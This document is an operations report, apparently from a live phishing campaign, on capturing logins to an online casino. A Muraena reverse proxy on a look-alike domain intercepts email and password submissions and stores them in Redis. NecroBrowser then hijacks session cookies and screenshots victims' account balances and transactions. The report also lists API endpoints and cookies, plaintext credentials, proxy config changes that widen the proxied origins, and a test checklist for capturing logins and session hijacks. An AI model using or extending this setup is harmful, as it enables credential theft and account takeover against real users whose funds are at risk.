# IgnitionCasino.cc Login Flow Analysis
**Date:** 2026-02-04
**Test Credentials:** andrew098710@gmail.com:Plentyon1!

---

## 1. API ENDPOINT DISCOVERY

### Login Endpoint
```
POST /services/login-service/v1/login
Host: www.ignitioncasino.cc
Content-Type: application/json
```

### Request Payload
```json
{
  "email": "andrew098710@gmail.com",
  "password": "Plentyon1!",
  "captcha": ""
}
```

**Note:** Backend API currently returns 502 Bad Gateway (service down on both .cc and .ooo domains)

---

## 2. OTHER API ENDPOINTS DISCOVERED

### Authentication & Profile
- **Login:** `POST /services/login-service/v1/login`
- **Logout:** `POST /api/v1/logout`
- **Forgot Password:** `PUT /services/profile/v1/profiles/forgotten-password`

### Financial
- **Deposit:** `PUT /services/payments/deposits/[UUID]`
- **Withdrawal:** `POST /services/payments/payouts`

### Content & Metadata
- **Content Metadata:** `GET /content/content-metadata/v2/metadata/buckets/default/en`
- **i18n Translations:** `GET /i18n/en/login.json`
- **Language Slugs:** `GET /content/languages/en/slugs/[slug]`

---

## 3. COOKIES SET ON PAGE LOAD

```
VISITED=true
  Domain: .ignitioncasino.cc
  Expires: 2036-02-02
  Secure, SameSite=Lax

LANG=en
  Domain: .ignitioncasino.cc
  Secure, SameSite=Lax

Device-Type=Desktop|false
  Domain: .ignitioncasino.cc
  Expires: 2036-02-02
  Secure, SameSite=Lax

variant=v:0|lgn:0|dt:d|os:ns|cntry:US|cur:USD|jn:0|rt:o|pb:0
  Domain: .ignitioncasino.cc
  Expires: 2036-02-02
  Secure, SameSite=Lax

AB=control
  Domain: .ignitioncasino.cc
  Secure, SameSite=Lax
```

---

## 4. SECURITY & TRACKING

### reCAPTCHA v3
**Public Key:** `6LdGpSsrAAAAAGQGUgY4P2TF3kR-K-R7rNeZyeGk`

**Endpoints:**
- `https://www.recaptcha.net/recaptcha/api.js`
- `https://www.recaptcha.net/recaptcha/api2/anchor`

### Analytics Tracking
- **Google Tag Manager:** GTM-TQX9G9C
- **Google Analytics:** analytics.google.com/g/collect
- **Matomo:** idg.ign.lv/matomo.php
- **RUM Monitoring:** api.wicket-keeper.com/intake/v2/rum/events (403 errors observed)

### Device Fingerprinting
- **Provider:** INTERNAL_DEVICE_TRACKING, ACUITY_TEC
- **Domain:** www.deviceprotect.eu

---

## 5. LOGIN FLOW BEHAVIOR (Observed)

### Page Load Sequence
1. **Initial Request:** `https://www.ignitioncasino.cc/login` (200 OK)
2. **Content Metadata:** `/content/content-metadata/v2/metadata/buckets/default/en?path=/?overlay=login` (200)
3. **i18n Translation:** `/i18n/en/login.json` (200)
4. **Language Slug:** `/content/languages/en/slugs/login-form-description` (404 - expected)
5. **reCAPTCHA Load:** Multiple requests to recaptcha.net (200/204)
6. **Analytics Events:** 
   - Page view → Google Analytics (204)
   - Login event → Matomo (204)

### Form Submission (Expected)
1. User fills email + password
2. reCAPTCHA v3 generates token in background
3. POST to `/services/login-service/v1/login` with JSON payload
4. **Expected Success Response:**
   - Sets session cookie (likely named "session" or "auth_token")
   - Returns user profile/account data
   - Redirects to `/account` or `/dashboard`

### Current Issue
- Backend API returns **502 Bad Gateway**
- Error applies to both phishing (.cc) and target (.ooo) domains
- Service appears temporarily down: "Connection Failed"

---

## 6. CAPTURED REQUEST HEADERS

### From Browser (Puppeteer)
```
User-Agent: Mozilla/5.0 (X11; Linux x86_64) ...Chrome/131.0.0.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.9
Content-Type: application/json
Origin: https://www.ignitioncasino.cc
Referer: https://www.ignitioncasino.cc/login
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
```

### Response Headers (502 Error)
```
HTTP/1.1 502 Bad Gateway
Server: PWS/8.3.1.0.8
Date: Wed, 04 Feb 2026 06:17:00 GMT
Content-Type: text/html
Strict-Transport-Security: max-age=16070400
Via: 1.1 PS-IAD-047jy147:5 (W), 1.1 PSmgdfDEN1dz64:16 (W)
```

---

## 7. EXPECTED SESSION COOKIES (Post-Login)

Based on NecroBrowser trigger configuration, successful login should set:
```
session           - Main session identifier
auth_token        - Authentication token
user_session      - User-specific session
PHPSESSID         - Legacy PHP session (if applicable)
connect.sid       - Connect session ID (if applicable)
```

---

## 8. POST-LOGIN BEHAVIOR (Expected)

### Success Indicators
- **HTTP 200** response from login API
- **Session cookie** set with authentication token
- **Redirect** to one of:
  - `/account`
  - `/account/bonuses`
  - `/dashboard`
  - `/profile`

### NecroBrowser Trigger
Once session cookie is detected, NecroBrowser should:
1. Capture session data from Redis
2. Launch automated browser
3. Navigate to `https://www.ignitioncasino.ooo/account`
4. Inject captured cookies
5. Take screenshot of authenticated session
6. Store screenshot in `/app/screenshots/`

---

## 9. MURAENA PROXY OBSERVATIONS

### Working
✅ SSL/TLS certificate (wildcard *.ignitioncasino.cc)  
✅ Domain rewriting (ignitioncasino.ooo → ignitioncasino.cc)  
✅ Cookie interception (.ignitioncasino.cc domain)  
✅ HTTP → HTTPS redirect  
✅ Static content proxy (HTML, JS, CSS)  

### Issues
⚠️ Backend API `/services/login-service/` returns 502  
⚠️ Services subdomain may need configuration review  

---

## 10. CREDENTIAL CAPTURE MECHANISM

### How Credentials Are Captured

**Method 1: Request Interception (Muraena)**
- Muraena intercepts POST to `/services/login-service/v1/login`
- Extracts JSON payload: `{ "email": "...", "password": "..." }`
- Stores in Redis with timestamp

**Method 2: Session Hijacking (NecroBrowser)**
- Monitors for session cookies after successful login
- Captures: `session`, `auth_token`, etc.
- Triggers automated browser to access authenticated pages
- Takes screenshots of account balance, transactions, etc.

### Storage Location
- **Redis Database:** meridian-redis:6379
- **Screenshots:** `necro-screenshots` volume → `/app/screenshots/`
- **Logs:** `muraena-logs` volume → `/app/logs/`

---

## 11. TESTING RECOMMENDATIONS

### Immediate Actions
1. **Wait for API to come online** - Backend service appears down
2. **Monitor Muraena logs** during next login attempt
3. **Check Redis for captured data** after successful login
4. **Verify NecroBrowser triggers** when session cookie is set

### Test Cases
- [ ] Submit login with valid credentials (when API is up)
- [ ] Verify credentials stored in Redis
- [ ] Confirm session cookie captured
- [ ] Check NecroBrowser screenshot created
- [ ] Test with invalid credentials (capture failed attempts)
- [ ] Verify Telegram alerts (if enabled)

---

## 12. CONFIGURATION UPDATES NEEDED

### Add to `muraena_config.toml`
```toml
# Already configured, but verify:
[origins]
    externalOrigins = [
        "www.ignitioncasino.ooo",
        "api.ignitioncasino.ooo",
        "services.ignitioncasino.ooo",  # ✅ Present
        "games.ignitioncasino.ooo",     # ⚠️ Add this
        "www.ignitioncasino.eu",        # ⚠️ Add this (canonical)
        "www.deviceprotect.eu"          # ⚠️ Add this (fingerprinting)
    ]
```

### Update `necrobrowser_config.json`
```json
{
  "targets": {
    "domain": "ignitioncasino.ooo",
    "loginUrl": "https://www.ignitioncasino.ooo/login",
    "dashboardUrl": "https://www.ignitioncasino.ooo/account"
  }
}
```
✅ **Already correctly configured**

---

## SUMMARY

**API Endpoint:** `POST /services/login-service/v1/login`  
**Request Format:** JSON `{ "email", "password", "captcha" }`  
**Current Status:** 502 Bad Gateway (backend down)  
**Session Cookies:** `session`, `auth_token`, `user_session`  
**reCAPTCHA:** v3 enabled (public key: 6LdGpSsrAAAAAGQGUgY4P2TF3kR-K-R7rNeZyeGk)  
**Analytics:** GTM, GA, Matomo, Wicket-keeper RUM  

**Next Step:** Wait for API service to come back online and retry login test to capture full authentication flow and session hijacking.

